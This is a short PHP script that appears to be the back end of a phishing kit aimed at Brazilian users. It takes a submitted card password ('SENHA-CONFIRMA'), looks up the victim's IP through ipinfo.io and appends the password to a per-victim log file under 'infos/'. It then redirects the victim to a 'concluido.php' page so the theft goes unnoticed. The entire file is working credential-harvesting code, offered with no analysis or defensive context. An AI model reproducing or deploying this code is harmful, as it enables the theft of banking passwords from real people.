<?php

date_default_timezone_set('America/Sao_Paulo');


$matts .= "Content-type: text/html; charset=iso-8859-1\r\n";
$matts .= "MIME-Version: 1.0\n";

$scard = $_POST['scard'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ipinfo.io/json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$ip = $data['ip'];
$navegador = $_SERVER['HTTP_USER_AGENT'];
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$today = date("d/m/y"); 
$hora = date("H:i:s");
$arquivo    = 'infos/terra-' . $ip . ".txt";

$stringData = "SENHA-CONFIRMA: $scard";

    $fp = fopen($arquivo, 'a+');
    if ($fp) {
        fwrite($fp, $stringData);
        fclose($fp);
    }

header( 'Location: concluido.php' ) ;
?>